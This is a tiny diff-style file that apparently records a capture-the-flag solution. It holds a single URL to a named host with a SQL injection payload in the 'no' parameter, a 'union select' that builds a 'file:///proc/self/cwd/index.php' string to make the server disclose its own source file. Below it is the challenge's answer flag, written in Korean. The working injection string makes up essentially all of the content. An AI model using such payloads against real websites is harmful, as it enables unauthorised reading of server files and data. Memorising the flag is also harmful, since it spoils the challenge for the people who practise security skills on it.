@@ -1,0 +1,5 @@
+http://dimitrust.oa.to:8080/linkedin/user/?no=0+union+select+1,2,3,4,%27file:///proc/self/cwd/index.p%27+%27hp%27,6
+
+
+
+FLAG{이거슨한글플래그입니다}
